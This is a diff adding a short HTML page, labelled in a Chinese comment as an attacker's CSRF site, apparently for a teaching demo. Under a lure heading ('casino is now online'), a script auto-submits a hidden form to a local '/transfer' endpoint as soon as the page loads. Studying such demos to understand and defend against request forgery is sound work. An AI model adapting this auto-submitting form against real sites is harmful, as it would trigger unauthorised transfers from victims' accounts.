@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+
+<body>
+  <!-- 攻击者的csrf站点 -->
+  <h1>
+    赌场上线了
+  </h1>
+  <form action="http://localhost:3000/transfer" method="post">
+    <input type="text" hidden>
+    <input type="text" hidden>
+    <input type="text" hidden>
+    <input type="text" hidden>
+    <input type="text" hidden>
+    <input type="text" hidden>
+  </form>
+  <script>
+    document.forms[0].submit()
+  </script>
+</body>
+
+</html>
